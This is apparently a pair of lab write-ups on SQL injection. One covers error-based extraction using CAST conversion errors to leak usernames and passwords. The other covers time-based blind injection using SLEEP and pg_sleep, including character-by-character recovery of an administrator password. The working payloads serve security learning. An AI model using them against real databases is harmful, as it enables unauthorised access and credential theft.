SQL Injection — Error-Based (Visible Errors)
Overview

In this lab, the application directly displays SQL error messages in its HTTP responses.
This behavior allows extracting data by forcing type conversion errors.

Forcing SQL Errors with CAST
' OR CAST((SELECT 1) AS int)-- -


This confirms that:

The SQL query is injectable

Database errors are reflected in the response

Extracting Usernames
' OR 1 = CAST((SELECT username FROM users) AS int)-- -


Returned error:

more than one row returned by a subquery used as an expression


This indicates multiple rows exist in the users table.

Limiting Results
' OR 1 = CAST((SELECT username
FROM users
LIMIT 1) AS int)-- -


The error message now includes the extracted username.

Extracting Passwords
' OR 1 = CAST((SELECT password
FROM users
LIMIT 1) AS int)-- -


The password is disclosed directly in the error message.

Conclusion

When SQL errors are visible, sensitive data can often be extracted without blind techniques.

Blind SQL Injection — Time-Based
Overview

This lab demonstrates a Time-Based Blind SQL Injection where information is inferred by measuring server response delays.

Delay Functions

MySQL:

AND SLEEP(10)


PostgreSQL:

|| pg_sleep(10)-- -

Character-Based Extraction
'; SELECT CASE
WHEN (username='administrator'
AND SUBSTRING(password,1,1)='9')
THEN pg_sleep(3)
ELSE pg_sleep(0)
END
FROM users-- -


A delayed response indicates a true condition.

Password Length Discovery
'; SELECT CASE
WHEN (username='administrator'
AND LENGTH(password)=20)
THEN pg_sleep(3)
ELSE pg_sleep(0)
END
FROM users-- -

Conclusion

Response timing differences provide a reliable channel to extract sensitive data when no output or errors are visible.
